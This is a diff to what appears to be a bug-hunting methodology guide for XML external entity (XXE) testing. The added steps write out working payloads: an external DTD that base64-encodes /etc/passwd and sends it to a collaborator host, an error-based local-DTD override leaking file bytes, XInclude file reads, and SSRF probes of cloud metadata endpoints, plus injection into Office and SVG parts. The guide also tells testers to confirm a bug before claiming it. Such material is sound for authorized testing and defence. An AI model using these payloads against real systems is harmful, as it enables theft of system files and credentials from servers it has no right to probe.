@@ -40,16 +40,39 @@ The parser resolves a DTD entity or an XInclude and reads a URI you chose. Moder
    ]>
    <root/>
    ```
-   Host `x.dtd` only if you can (your collaborator that logs the HTTP path is enough for the fetch proof). For file bytes, the external DTD has to echo them back — newlines and `&` in the file break a URL, so prefer the PHP base64 filter or the error channel (step 6). A hit proves the fetch. It does not prove `/etc/passwd`.
+   Host `x.dtd` only if you can (your collaborator that logs the HTTP path is enough for the fetch proof). A hit proves the fetch. It does not prove `/etc/passwd`. For file bytes, serve this DTD (newlines/`&` break a URL — base64 or the error channel in step 6):
+   ```xml
+   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://UNIQUE.collab/?d=%file;'>">
+   %eval;
+   %exfil;
+   ```
+   Non-PHP: `% file SYSTEM "file:///etc/passwd"` and accept a truncated first-line exfil, or switch to step 6. Quote the decoded bytes (`root:x:0:0:`), not the Collaborator DNS line.
 5. **DOCTYPE blocked → XInclude** (no DTD):
    ```xml
    <root xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </root>
    ```
-6. **Egress blocked → error-based or a local DTD.** Force the file into a parser error string (`file:///does-not-exist/%file;`). If outbound HTTP is closed but local DTD files exist, redefine a parameter entity from a DTD that is already on disk (the "repurpose a local DTD" technique). Claim it only when the error body contains file bytes.
+6. **Egress blocked → error-based or a local DTD.** Force the file into a parser error string. Parameter entities in the **internal** subset are rejected by current libxml2; if `%dtd;` errors, switch to a DTD already on disk or to XInclude. One local-DTD shape (the overridable name differs per file — `ISOamso` is the docbook one; if this path 404s inside the error, try the next candidate, do not loop):
+
+   ```xml
+   <!DOCTYPE foo [
+     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+     <!ENTITY % ISOamso '
+       <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+       <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///does-not-exist/&#x25;file;&#x27;>">
+       &#x25;eval;
+       &#x25;err;
+     '>
+     %local_dtd;
+   ]>
+   <root/>
+   ```
+
+   `ISOamso` is specific to docbook DTDs. If that file is absent, the error will say so — try `file:///usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd` once, then stop. A fontconfig DTD will not define `ISOamso`; do not reuse this entity name against it. Claim the bug only when the error body contains file bytes (`root:x:0:0:`), not the path you typed.
 7. **SSRF.** Point `SYSTEM` at `http://127.0.0.1:<port>/` and at link-local metadata. IMDSv1 may return role JSON. IMDSv2 answers GET with 401 until a PUT token — XXE cannot set that flow unless you show the token request. 401 from the metadata IP is reachability, not keys. GCP needs header `Metadata-Flavor: Google`, which most XXE sinks cannot add.
-8. **Office/SVG.** Unzip the document, inject the entity into `word/document.xml`, `xl/workbook.xml`, `ppt/slides/slide1.xml`, or `[Content_Types].xml`, rezip, upload. SVG: entity in a `<text>` node. Same validation as step 3.
+8. **Office/SVG.** Unzip the document, inject the entity into the part that parser actually reads: `word/document.xml` (and `word/header1.xml` if the body is ignored), `xl/sharedStrings.xml` (workbook.xml alone often is not the string table), `ppt/slides/slide1.xml`, or `[Content_Types].xml`. Rezip, upload. SVG: entity in a `<text>` node. Same validation as step 3. PDF XFA is the same probe inside the XFA XML packet, not a separate bug class.
 
 ## Parser expectations (probe anyway)
 
